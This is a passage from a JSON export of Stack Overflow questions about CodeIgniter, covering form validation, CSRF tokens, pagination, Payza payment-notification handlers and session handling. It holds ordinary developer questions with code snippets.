$this-&gt;view('theme/msg', $data);\n        }\n    }\n\n}\n</code></pre>\n\n<p>model function </p>\n\n<pre><code>function send()\n{\n   $this-&gt;db-&gt;set('ML_Email', $this-&gt;input-&gt;post('ML_Email'));\n   $this-&gt;db-&gt;set('status', $this-&gt;input-&gt;post('status'));\n   $this-&gt;db-&gt;set('ML_Date',  date(\"l jS \\o\\F\\ F Y H:i:s a\"));\n   $this-&gt;db-&gt;insert('d_mailinglist');\n   return TRUE;\n}\n</code></pre>\n"},{"tags":["php","codeigniter","post"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12445472,"title":"store the $_POST form data if page fail to submit","body":"<p>I am using codeigniter. I am currently having a very simple form (nothing but input fields) that submits to the controller for processing. </p>\n\n<p>That all doesn't matter, but what I am asking about is that I have an upload file in the form also. so the upload function will check for file size and type and so on and gives error if not complying. when that happens and I choose another file that matches the requirement, I submit but nothing goes to next page but the uploaded file and its details while the other fields are not posted or are blank.</p>\n\n<p>It is as if the post is not cached and when I select new file to upload and its okay, it checks $_POST of those fields and they are empty. How can I check for that so that to make sure all fields contain values?</p>\n\n<p>Thank you and more than happy to help elaborating.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":62,"score":3,"question_id":12445692,"title":"How to add and verify tokens (against CSRF etc.) in links not forms in CodeIgniter?","body":"<p>I know how to enable CSRF in forms in CodeIgniter, however I am not sure how to implement this feature in CodeIgniter classic link (e.g. for adding/deleting private messages, posts etc. in admin area)</p>\n\n<p>Now I am using something like this:</p>\n\n<p><strong>VIEW</strong></p>\n\n<pre><code>&lt;?php echo anchor('account/delete_private_message/'.$obj-&gt;pmID, 'delete mesage', array('onclick' =&gt; 'return confirm(\\'Do you really want to delete this private message?\\');', 'class' =&gt; 'delete-message-button')); ?&gt;\n</code></pre>\n\n<p><strong>CONTROLLER</strong></p>\n\n<pre><code>function delete_private_message($pmID = '')\n    {\n\n        $deleted_pm = $this-&gt;account_model-&gt;delete_pm($pmID);\n\n        if($deleted_pm)\n        {\n            $this-&gt;session-&gt;set_flashdata('status', 'PM was deleted successfully');\n        }\n        else\n        {\n            $this-&gt;session-&gt;set_flashdata('status', 'Error');\n        }\n        redirect('account/private_messages');\n    }\n</code></pre>\n\n<p><strong>MODEL</strong></p>\n\n<pre><code>function delete_pm($pmID)\n    {\n\n        $return = 0;\n        if(!empty($pmID))\n        {\n            $this-&gt;db-&gt;where('pmID', $pmID);\n            $result = $this-&gt;db-&gt;delete('private_messages');\n        }\n        return $result;\n    }\n</code></pre>\n\n<p>And if user click on OK in the popup the message is deleted.</p>\n\n<p>The question is how to add token to the link and to the session of the user and verify it etc. I do not know how to achieve this to work properly.</p>\n\n<p><strong>EDIT:</strong> I just guess I have to add the generated token at the end of the link like:</p>\n\n<blockquote>\n  <p>account/delete_private_message/1239/dfdf6e7re67a6e87r6e87r69876bn3</p>\n</blockquote>\n\n<p>and the value dfdf6e7re67a6e87r6e87r69876bn3 also in the session of the current user and verify them in controller. However, what ecxactly should I do, I don't know. So, any help is appreciated.</p>\n"},{"tags":["php","jquery","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":65,"score":3,"question_id":12445597,"title":"jquery script does not execute","body":"<p>Currently, I am using jquery, php and codeigniter to write a program - However, I've come across a problem.</p>\n\n<p>When I write view file using the codeigniter php framework, I cannot execute the JQuery by using the URL <code>127.0.0.1/ci/welcome/passdataview/6/7</code>. If I use <code>127.0.0.1/ci/welcome/passdataview</code>, the JQuery script can be executed.</p>\n\n<p>Can anyone tell me how to execute the jquery script with codeigniter parameter in URL?</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n&lt;script type=\"text/javascript\" src=\"../js/jquery-1.7.1.js\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\"&gt;\n\n$(document).ready(function(){\nalert (\"here\");\n});\n\n&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div&gt;&lt;h2&gt;demo 1&lt;/h2&gt;&lt;/div&gt;\n&lt;input type=\"hidden\" id=\"hidden1\" value=\"&lt;?php echo $username;?&gt;\"&gt;\n&lt;input type=\"hidden\" id=\"hidden2\" value=\"&lt;?php echo $subject;?&gt;\"&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","session"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12445595,"title":"Create session with some data expiring earlier than others","body":"<p>I'd like to know if there is any way to create session data that expires earlier than default session expire time in codeigniter?</p>\n\n<p>For example, storing shopping cart indefinitely but everything else expires after 30 minutes.</p>\n\n<p>Do I have to do it the hard way (deleting them manually)?</p>\n\n<p>Thanks.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12444994,"title":"Is trim enough for dropdown and checkbox/radiobox when validating form in controller or should I also always use xss_clean?","body":"<p>Is trim enough for dropdown and checkbox/radiobox when validating form or should I also always use xss_clean?</p>\n\n<p>I guess I should but, can somebody explain to me, why exactly? Thanks.</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":12445108,"title":"Should I save validation $_POST value into a variable or not in CI?","body":"<p>E.g. I have something like this in my controller:</p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_rules('email', 'Email', 'required|valid_email|xss_clean');\n$this-&gt;form_validation-&gt;set_rules('name', 'Name', 'trim|xss_clean');\n</code></pre>\n\n<p>Now my question is, if I later in my code do something like this (inside the same method):</p>\n\n<pre><code>$user_profiles = array(\n\n'email' =&gt; $_POST['email'],\n'name' =&gt; $_POST['name']\n); \n</code></pre>\n\n<p>Will, the variables in this array sanitized or not?</p>\n\n<p>I mean will the form_validation->set_rules remain for all the later code usage of the $_POST values or I need to use some other technique?</p>\n"},{"tags":["php","facebook","codeigniter","facebook-php-sdk"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":584,"score":2,"question_id":10424316,"title":"Facebook PHP-SDK with CodeIgniter not returning $_REQUEST['signed_request']","body":"<pre><code>class Example extends CI_Controller {\n\n    function __construct()\n    {\n        parent::__construct();\n    }\n\n    function index()\n    {\n\n        $this-&gt;load-&gt;library('facebooklib');\n\n        $user = $this-&gt;facebooklib-&gt;getUser();\n\n        if ($user) {\n            try {\n                $data['user_profile'] = $this-&gt;facebooklib-&gt;api('/me');\n            } catch (FacebookApiException $e) {\n                $user = null;\n            }\n        }\n\n        var_dump($_REQUEST);\n\n        if ($user) {\n            $data['logout_url'] = $this-&gt;facebooklib-&gt;getLogoutUrl();\n        } else {\n            $data['login_url'] = $this-&gt;facebooklib-&gt;getLoginUrl();\n        }\n\n        $this-&gt;load-&gt;view('view',$data);\n    }\n}\n</code></pre>\n\n<p>After clicking on the Login link, I am taken to Facebook permissions page, I accept, and I am returned to the same page with no data.</p>\n\n<pre><code>array(3) {\n  [\"/example\"]=&gt;\n  string(0) \"\"\n  [\"PHPSESSID\"]=&gt;\n  string(32) \"33a446883d4fb1877fb6dcff6d70799a\"\n  [\"ci_session\"]=&gt;\n  string(311) \"a:4:{s:10:\"session_id\";s:32:\"d8bb3926550e3ec1b9d075b456708e9b\";s:10:\"ip_address\";s:9:\"127.0.0.1\";s:10:\"user_agent\";s:120:\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.168 Safari/535.19\";s:13:\"last_activity\";i:1336011855;}c874fb95984396f04ab6cc17217102d7\"\n}\n</code></pre>\n\n<p>My $_REQUEST dump doesn't really show signed_request, which is a problem.</p>\n"},{"tags":["codeigniter","curl","http-status-code-500","ipn"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":104,"score":0,"question_id":12444363,"title":"500 Internal Server Error on Payza IPN Handler","body":"<p>I am migrating an app from PayPal to Payza (formerly AlertPay). When I run the code directly from the browser to test the token handling it shows up in the logs and I get a proper response: token=47TXhMVgdPrmV3n5aauIZ5CC0MrytYXWjID81pjVnQsEhkSUklPXT3clXZ4SFUFOL5WqepRUpBz5SKomoyPuDw==&amp; INVALID TOKEN.   When I run the full IPN response directly in the browser I get a fail but no visible errors.</p>\n\n<p>But when I generate a transaction or resend an IPN from Payza it is not showing up in the log and I am getting a 500 Internal Server Error. I have turned on allow Query Strings in the CI config file.</p>\n\n<pre><code>class PayzaIPN {  \nfunction validate_ipn($payzaIPN ='',$logId = null)  {\n\ndefine(\"IPN_V2_HANDLER\", \"https://secure.payza.com/ipn2.ashx\");\ndefine(\"TOKEN_IDENTIFIER\", \"token=\");\n$_POST['token'] = ''; \n\n$token = urlencode($_POST['token']);\n\n$token = TOKEN_IDENTIFIER.$payzaIPN;\n\n\n\n$response = '';\n\n$ch = curl_init();\n\ncurl_setopt($ch, CURLOPT_URL, IPN_V2_HANDLER);\ncurl_setopt($ch, CURLOPT_POST, true);\ncurl_setopt($ch, CURLOPT_POSTFIELDS, $token);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\ncurl_setopt($ch, CURLOPT_HEADER, false);\ncurl_setopt($ch, CURLOPT_TIMEOUT, 60);\ncurl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n\n$response = curl_exec($ch);\n\ncurl_close($ch);\n\nif(strlen($response) &gt; 0)\n</code></pre>\n"},{"tags":["php","sql","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12443805,"title":"Cron job using codeignitor on an ubuntu server","body":"<p>I'm having trouble setting up a cron job. </p>\n\n<p>I have a cron job created at a url like so:</p>\n\n<p>myurl.com/cron</p>\n\n<p>When that link is accessed, it is run.</p>\n\n<p>How do I set it so that it runs automatically, every 10 minutes?</p>\n\n<p>I can't figure out how to create a cron job.  I know that that's what I need to do, but I can't figure out how to do it for a ubuntu server. </p>\n"},{"tags":["codeigniter","file-upload","form-validation"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12443522,"title":"Code Igniter form validation and file upload?","body":"<p>I have a file upload as part of my form,</p>\n\n<p>I am using the code igniter form validation library,</p>\n\n<p>I am also using the code igniter upload library,</p>\n\n<p>I know how to upload images etc using the upload library but I want to include basic validation of the file during the form validation (e.g. required, maxsize, filetype).</p>\n\n<p>I get that I will need to do a callback but the issue is that the validation library only checks <code>$_POST</code> it does not check <code>$_FILES</code></p>\n\n<p>How can I do this?</p>\n\n<p>I was thinking perhaps to copy over the required input to the post array</p>\n\n<p><code>$_POST['image'] = $_FILES['image']</code></p>\n\n<p>and then run the validation with just a callback, which does the actual validation using the upload library on the actual <code>$_FILES</code> item, but that seems a bit hacky.</p>\n\n<p>Is there a better way of doing this?</p>\n"},{"tags":["php","mvc","codeigniter","guidelines"],"answer_count":4,"favorite_count":16,"up_vote_count":16,"down_vote_count":0,"view_count":2553,"score":16,"question_id":800555,"title":"MVC done right - Examples","body":"<p>I am new to both the MVC pattern and PHP frameworks. I picked up a copy of <a href=\"http://rads.stackoverflow.com/amzn/click/1847191746\" rel=\"nofollow\">CodeIgniter for Rapid PHP Application Development</a>, but the author does not use the M part of MVC and I can't seem to get his code examples to work. CodeIgniter's <a href=\"http://codeigniter.com/user%5Fguide/overview/mvc.html\" rel=\"nofollow\">User Guide</a> is not very detailed about what goes into which component either.</p>\n\n<p>What I'm looking for are examples of correct usage of MVC (preferably PHP, CodeIgniter) whose source code can be examined, maybe some guidelines, too, such as \"What kind of logic can go into views\" or \"Should models be able to modify the data obtained from the database.\" I'd appreciate some tips on nesting views, too.</p>\n"},{"tags":["php","javascript","oop","mvc","codeigniter"],"answer_count":6,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":521,"score":2,"question_id":5398852,"title":"PHP MVC with pure Javascript View : good practice?","body":"<p>My question might not be understandable enough, so let me explain the situation :</p>\n\n<p>I'm working on a big ajax webApp built, server side, with PHP using CodeIgniter. This framework saperates clearly models, controllers and views. The view files are rendered in HTML and then sent to the client that does some js treatments on it (like attaching events).</p>\n\n<p>This way of working seems strange to me, as it separates the view between the server side and the client side.</p>\n\n<p>I was thinking about moving all the View treatments to the client part that will build dynamically its html in js. The server side will then send only raw data.</p>\n\n<p>I worked this way on smaller projects, and I was really happy with the result (easily understandable, portable and reusable).</p>\n\n<p>Is it a right way to implement an MVC app ? Any advices around that reflexion ?</p>\n"},{"tags":["php","javascript","codeigniter","tcp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12441531,"title":"TCP implementation in php chat application","body":"<p>Friends, i want to start learning TCP implementation in my php website chat plugin.</p>\n\n<p>I have developed a chat plugin with jquery-ajax, it's tedious task to frequently requesting to database and it's give load to server.</p>\n\n<p>i developed website in CodeIgnitor Framwork.</p>\n\n<p>My Question is :</p>\n\n<p>-> Any library for TCP implementation in php(CodeIgnitor)?\n -> Is it tough task to TCP implementation in PHP?</p>\n\n<p>Thanks in advance!  </p>\n"},{"tags":["codeigniter","url"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":12247823,"title":"CodeIgniter -> URI Class, more specific; uri->uri_string()","body":"<p>with CI, when I do this:</p>\n\n<pre><code>var_dump($this-&gt;uri-&gt;uri_string());\n\nvar_dump($this-&gt;config-&gt;item('base_url'));\n</code></pre>\n\n<p>in controller <code>all</code> and method <code>index()</code>, I get these outputs:</p>\n\n<pre><code>string 'dropbox/derrek/shopredux/afsgasg/sasga' (length=36)\n\nstring 'http://localhost/dropbox/derrek/shopRedux/' (length=40)\n</code></pre>\n\n<p>shouldn't <code>$this-&gt;uri-&gt;uri_string()</code> output: afsgasg/sasga?\nwhat have I done wrong?</p>\n\n<h2><strong>My routes.php config</strong></h2>\n\n<pre><code>$route['(:any)'] = 'all/index/$1';\n\n$route['default_controller'] = 'all/index';\n\n$route['404_override'] = ''; \n</code></pre>\n\n<hr>\n\n<h2><strong>My .htaccess in same folder as index.php</strong></h2>\n\n<pre><code>RewriteEngine on\n\nRewriteCond %{REQUEST_FILENAME} !-f\n\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteRule ^(.*)$ index.php/$1 [PT,L]\n</code></pre>\n\n<hr>\n\n<h2>My config.php config</h2>\n\n<pre><code>$config['base_url'] = ((isset($_SERVER['HTTPS']) &amp;&amp; $_SERVER['HTTPS'] == \"on\") ? \"https\" : \"http\");\n$config['base_url'] .= \"://\".$_SERVER['HTTP_HOST'];\n\n$config['base_url'] .= str_replace(basename($_SERVER['SCRIPT_NAME']),\"\",$_SERVER['SCRIPT_NAME']);\n\n$config['index_page'] = '';\n\n$config['uri_protocol'] = 'AUTO';\n</code></pre>\n\n<hr>\n\n<p>if there is further info needed I am happy to supply.</p>\n"},{"tags":["codeigniter","paypal","paypal-api"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":12440382,"title":"where to find Paypal_lib.php?","body":"<p>I have searched a lot for this file but can't find it. Many people have given this link but when i go to this link it will show content pages. no download file.\nPlease help me soon.</p>\n"},{"tags":["php","codeigniter","models"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":39,"score":-5,"question_id":12438983,"title":"Codeigniter using autoloaded model","body":"<p>I add a model in autoload file like this:</p>\n\n<pre><code>$autoload['model'] = array('themodel');\n</code></pre>\n\n<p>And i want to know how to use it in the controller because when i write $this it get the current controller functions</p>\n\n<p>Thanks,</p>\n"},{"tags":["php","codeigniter","image-processing","image-resizing","plupload"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12438813,"title":"Premature end of JPEG file","body":"<p>I am getting this Premature end of JPEG file error while resizing some of the images. Interesting and strange part is that i am getting this error only when i upload any camera taken images, like from mobile, other than those every thing works great. I thought this could be because of the chunk size used in plupload. So, i uploaded with larger sized image to somewhat like 3mb to test. Works fine with images other than camera taken images. So, whenever i upload camera pics i get this error.</p>\n\n<p>Further elaborations on the error: php function imagecreatefromjpeg is throwing an error \"imgname.jpg is not a valid JPEG file\".</p>\n\n<p>To resize images i am using Codeigniter's image Manipulation Class. </p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12438229,"title":"Whch is correct redirect('/') or redirect('') in Codeigniter?","body":"<p>Both are working, but I am asking if there is any difference or can I just use redirect(); ?</p>\n\n<p>So from these 3 variants, which one is the one that I should stick to?</p>\n\n<pre><code>redirect('/');\n</code></pre>\n\n<p>or</p>\n\n<pre><code>redirect('');\n</code></pre>\n\n<p>or</p>\n\n<pre><code>redirect();\n</code></pre>\n"},{"tags":["codeigniter","paypal"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12428121,"title":"Migrating CodeIgniter PayPal IPN Handler to Payza IPN Handler","body":"<p>Apologies for such a neophyte request but guidance greatly appreciated.  I need to integrate the Payza (formerly AlertPay) IPN handler into the class/function structure that was previously used with PayPal.  </p>\n\n<p>My PayPal IPN handler has this construction:</p>\n\n<pre><code>class PayPalIPN {\n\npublic $paypal_url;\npublic $socket_url;\npublic $ipn_response;\npublic $ipn_data;\n\n\n\nfunction __construct() {\n    $this-&gt;paypal_url       = 'https://www.paypal.com/cgi-bin/webscr';\n    $this-&gt;socket_url       = 'www.paypal.com';\n    $this-&gt;ipn_response     = '';\n}\n\n\n\nfunction validate_ipn($logId = null) {\n\nDo stuff\n}\n</code></pre>\n\n<p>The Payza (formerly AlertPay) IPN handler sample code looks like this:</p>\n\n<pre><code>define(\"IPN_V2_HANDLER\", \"https://secure.payza.com/ipn2.ashx\");\ndefine(\"TOKEN_IDENTIFIER\", \"token=\");\n\n// get the token from Payza\n$token = urlencode($_POST['token']);\n\n//preappend the identifier string \"token=\" \n$token = TOKEN_IDENTIFIER.$token;\n\n/**\n * \n * Sends the URL encoded TOKEN string to the Payza's IPN handler\n * using cURL and retrieves the response.\n * \n * variable $response holds the response string from the Payza's IPN V2.\n */\n\n$response = '';\n\n$ch = curl_init();\n\ncurl_setopt($ch, CURLOPT_URL, IPN_V2_HANDLER);\ncurl_setopt($ch, CURLOPT_POST, true);\ncurl_setopt($ch, CURLOPT_POSTFIELDS, $token);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\ncurl_setopt($ch, CURLOPT_HEADER, false);\ncurl_setopt($ch, CURLOPT_TIMEOUT, 60);\ncurl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n\n$response = curl_exec($ch);\n\ncurl_close($ch);\n</code></pre>\n\n<p>I started off with this: </p>\n\n<pre><code>class PayzaIPN {\n\npublic $IPN_V2_HANDLER;\npublic $TOKEN_IDENTIFIER;\npublic $response;\npublic $ipn_data;\npublic $token;  \n\n\n//define(\"TOKEN_IDENTIFIER\", \"token=\");\n\n//define(\"IPN_V2_HANDLER\", \"https://secure.payza.com/ipn2.ashx\");\n//define(\"IPN_V2_HANDLER\", \"https://sandbox.Payza.com/sandbox/IPN2.ashx\");\n\nfunction validate_ipn($logId = null)  { \n$this-&gt;IPN_V2_HANDLER = 'https://sandbox.Payza.com/sandbox/IPN2.ashx';\n$this-&gt;token = TOKEN_IDENTIFIER.$token;\n</code></pre>\n\n<p>I am having trouble getting the variables properly declared in the correct structure - getting T_function expected errors and undefined constant errors.  </p>\n"},{"tags":["php","html","codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12430776,"title":"pass relevant hidden field values from the form to the controller","body":"<p>Im having a page that shows monthly subscriptions of a user which is created using codeigniter. what i want to do is when a the user clicks on make payment pass the values in the hidden files to the controller.</p>\n\n<pre><code>&lt;?php echo form_open('options/done');?&gt;\n    &lt;table class=\"tables\"&gt;\n        &lt;thead&gt;\n            &lt;tr&gt;\n                &lt;th&gt;Ref Code&lt;/th&gt;\n                &lt;th&gt;Month&lt;/th&gt;\n                &lt;th&gt;Year&lt;/th&gt;\n                &lt;th&gt;action/th&gt;\n            &lt;/tr&gt;\n        &lt;/thead&gt;\n        &lt;tbody&gt;\n            &lt;?php foreach ($payments as $s =&gt;$payment):?&gt;\n                &lt;?php $month = $payment['month'];?&gt;\n                &lt;input type=\"hidden\" value=\"&lt;?php echo $month;?&gt;\" name=\"month_&lt;?php echo $s;?&gt;\" /&gt;\n                &lt;input type=\"hidden\" value=\"&lt;?php echo $payment['ref_code'];?&gt;\" name=\"ref_&lt;?php echo $s;?&gt;\" /&gt;\n                &lt;tr&gt;\n                    &lt;td&gt;&lt;?php echo $payment['ref_code'];?&gt;&lt;/td&gt;\n                    &lt;td&gt;&lt;?php echo $month;?&gt;&lt;/td&gt;\n                    &lt;td&gt;&lt;?php echo $payment['year'];?&gt;&lt;/td&gt;\n                    &lt;td&gt;&lt;input type=\"submit\" value=\"MAKE PAYMENT\" class=\"red\" /&gt;&lt;/td&gt;\n                &lt;/tr&gt;\n            &lt;?php endforeach; ?&gt;\n        &lt;/tbody&gt;\n    &lt;/table&gt;\n&lt;?php echo form_close();?&gt;\n</code></pre>\n\n<p>so when someone hits the submit button how can i pass only the hidden values which are relevant to that table row?</p>\n"},{"tags":["php","codeigniter","pagination"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12436686,"title":"Pagination not working properly in codeigniter","body":"<p>I have pagination on my view which is working fine if i am clicking on next number link.like:</p>\n\n<pre><code>1 2 &gt; \n</code></pre>\n\n<p>So if i am clicking on 2 it goes on second page and shows proper result.but now if i want to come back on 1 than its not redirecting me.even if there is link 3 than i couldn't come on 2.here is my code:</p>\n\n<p>Controller:</p>\n\n<pre><code>function list_providers()\n    {\n\n      $admin_session_data= $this-&gt;session-&gt;userdata('user_logged_in');\n\n      $this-&gt;load-&gt;model('/admin/provider_model');\n\n\n\n\n                $this-&gt;load-&gt;library('pagination');\n                            $this-&gt;load-&gt;helper('url');\n\n\n\n                        $config['base_url'] = base_url().\"index.php/admin/provider/list_providers/\";\n                        $config['total_rows'] = $this-&gt;provider_model-&gt;countprovider();\n                        $config['per_page'] = 3;\n                            $config['creat_link'] = 1;\n                $config['first_link'] = 'First';\n                $config['last_link'] = 'Last';\n\n                            $this-&gt;pagination-&gt;initialize($config);\n                $offset=($this-&gt;uri-&gt;segment(4)) ? $this-&gt;uri-&gt;segment(4) : 0;\n                $data['list']= $this-&gt;provider_model-&gt;listproviders($config['per_page'],$offset);\n\n                //$data['customer']= $this-&gt;provider_model-&gt;getcustomer_data($config['per_page'],$this-&gt;uri-&gt;segment(3));\n\n\n             if(!empty($data))\n          {   \n              $this-&gt;load-&gt;view('admin/admin_header',$admin_session_data); \n              $this-&gt;load-&gt;view('admin/admin_top_nav',$admin_session_data); \n              $this-&gt;load-&gt;view('admin/admin_left',$admin_session_data);\n              $this-&gt;load-&gt;view('admin/provider_list',$data);\n              $this-&gt;load-&gt;view('admin/admin_footer',$admin_session_data);\n          }\n\n    } \n</code></pre>\n\n<p>Model:</p>\n\n<pre><code>function listproviders($num,$offset)\n         {\n            $this-&gt;load-&gt;library('pagination');\n\n          //$query=$this-&gt;db-&gt;get_where('users', array('user_role_id'=&gt;'3'));\n                $query=$this-&gt;db-&gt;get('users',$num,$offset);\n\n       // return result set as an associative array\n          return $query-&gt;result_array();\n         }\n\n\n         function countprovider()\n        {\n        $this-&gt;load-&gt;library('pagination');\n        $query=$this-&gt;db-&gt;count_all_results('users');\n        return $query;\n                }\n</code></pre>\n\n<p>And my pagination is showing like this: 1 2 ></p>\n\n<p>Please see where is problem.</p>\n"},{"tags":["database","codeigniter","model"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12435677,"title":"Autoloading model on demand in codeigniter","body":"<p>Can I somehow omit the first line? i.e. <code>$this-&gt;load-&gt;model('Model_name');</code> and autoload it when necessary?</p>\n\n<p>To load a model you will use the following function:</p>\n\n<pre><code>$this-&gt;load-&gt;model('Model_name');\n</code></pre>\n\n<p>Once loaded, you will access your model functions using an object with the same name as your class:</p>\n\n<pre><code>$this-&gt;Model_name-&gt;function(); \n</code></pre>\n"},{"tags":["php","codeigniter","tankauth"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12434071,"title":"Callback function error","body":"<p>Ok, So i am creating a simple callback function to check to see if the user has inserted a banned word. Here i what i have so far: (This is using codeigniter and tankauth)</p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_rules('firstname', 'First Name', 'trim|alpha|xss_clean|min_length[2]|max_length[50]|callback_is_banned_word');\n$this-&gt;form_validation-&gt;set_rules('lastname', 'Last Name', 'trim|alpha|xss_clean|min_length[2]|max_length[50]|callback_is_banned_word');\n</code></pre>\n\n<p>is_banned_word() function:</p>\n\n<pre><code>//Check if first or last name is a banned word\nfunction is_banned_word($input) {\n    $banned_words = array(\"word1\",\"word2\",....\"wordn\"); //This is a really long array\n    foreach($banned_words as $words) {\n        if (stripos($input,$words) !== false) {\n            $this-&gt;form_validation-&gt;set_message('is_banned_word', 'There is a banned word your phrase.');\n            return FALSE;\n        }\n        else {\n            return TRUE;\n        }\n    }\n    return TRUE;\n}\n</code></pre>\n\n<p>Any help?</p>\n"},{"tags":["php","mvc","codeigniter","frameworks"],"answer_count":6,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":492,"score":5,"question_id":9868580,"title":"Big Headache: CodeIgniter or custom made framework, what's your thoughts?","body":"<p>If you'd like to develop a WebApp which you know that is going to scale and become bigger and bigger over time, would you use CodeIgniter or your custom made framework?</p>\n\n<p>What's your arguments for using an open source framework and what's your arguments against it.</p>\n\n<p>Here are my thoughts:\n<strong>CodeIgniter Pros</strong></p>\n\n<ul>\n<li>Great documentation -> Easier to work in a team.</li>\n<li>All the development time is invested in the business logic.</li>\n<li>Not reinventing the wheel</li>\n</ul>\n\n<p><strong>CodeIgniter Cons</strong></p>\n\n<ul>\n<li>Not sure how scalable it is if I'll want to grow</li>\n<li>MIT License - not sure what it means, but if I'll want to sell my app on per license basis, I'm not sure I'll be able to do that.</li>\n</ul>\n\n<p><strong>Custom coded Framkework Pros</strong></p>\n\n<ul>\n<li>Scalable. I can decide how it will grow.</li>\n<li>I own the code</li>\n<li>Flexcible design.</li>\n</ul>\n\n<p><strong>Custom coded Framework Cons</strong></p>\n\n<ul>\n<li>Need to document it, so others will be able to collaborate.</li>\n<li>Need to invest time to maintain the framework</li>\n<li>Unexpected errors/bugs</li>\n</ul>\n\n<p>What's your take on that? My brain tells me to go with CodeIgniter, my heart tells me to build my own framework.</p>\n"},{"tags":["php","mysql","mvc","codeigniter","recursion"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":94,"score":1,"question_id":12433861,"title":"CodeIgniter and binary tree iteration/organization","body":"<p>I'm developing a CI project that needs to outputs a perfect binary tree in HTML.  Each node in the tree relates to a record in a table.  The table currently has upwards of 10 million rows and I'm going to need to output a tree with depth of at least 9, so things could get slow quickly if it's not built optimally.</p>\n\n<p>Using the CI's MVC paradigm, what's the best way to organize this data?  With such a large table, I don't want to have to hit the database too many times, and building a tree like this can get costly very quickly (# cells = 2^(depth+1)-1).</p>\n\n<p>So far I've built the controller to handle the request (easy part) and a library to handle/build the tree structure by recursively hitting the DB and creating an object for each node.  I'm sorta stuck on how to organize the rest.  Should I handle the tree traversal and HTML output from within a view/helper?  If we do that, there's going to be a whole bunch of logic in the view(s) which I know people try to avoid.  Similarly, I know it's looked down upon to output any HTML from within a library but given this structure it almost seems like it's logical to handle all the recursion/output from there.</p>\n\n<p>Any advice would be very helpful, and thanks in advance!</p>\n"},{"tags":["php","codeigniter","tankauth"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12430545,"title":"CodeIgniter: TankAuth, Check user date of birth as a callback","body":"<p>Ok, So I ave implemented a Date of Birth into the user registration. What I want to do now is take that date of birth and check to see if they are above a certain age (13) before they register. They way I did DOB is kinda weird, but it works. I have 3 field dob1, dob2, dob3. <a href=\"http://stackoverflow.com/questions/12379703/codeigniter-tank-auth-adding-date-of-birth-issues\">CodeIgniter: Tank Auth, Adding Date of Birth Issues</a> here is how i implemented it if anyone is interested. Anyway, this is what I have been trying so far: EDIT: the syntax the user puts in is mm dd yyyy</p>\n\n<pre><code>function is_old_enough($input, $dob1, $dob2) {\n          $dob = $dob1.$dob2.$input;\n          $date = date('md').(date('Y')-13);\n          if ((int)$dob &lt; (int)$date)\n            $this-&gt;form_validation-&gt;set_message('is_old_enough', 'You are not old enough to have an account on this site.');\n          return $input;\n        }\n</code></pre>\n\n<p>And here is what is inside the register() function.</p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_rules('dob1', 'Date of Birth Month', 'trim|required|xss_clean|exact_length[2]');\n$this-&gt;form_validation-&gt;set_rules('dob2', 'Date of Birth Day', 'trim|required|xss_clean|exact_length[2]');\n$this-&gt;form_validation-&gt;set_rules('dob3', 'Date of Birth Year', 'trim|required|xss_clean|exact_length[4]|callback_is_old_enough[dob1||dob2]');\n</code></pre>\n\n<p>Am I close? Am i way off? Anyone help? Right now all it does is pretends like I never created this callback and puts the user in even 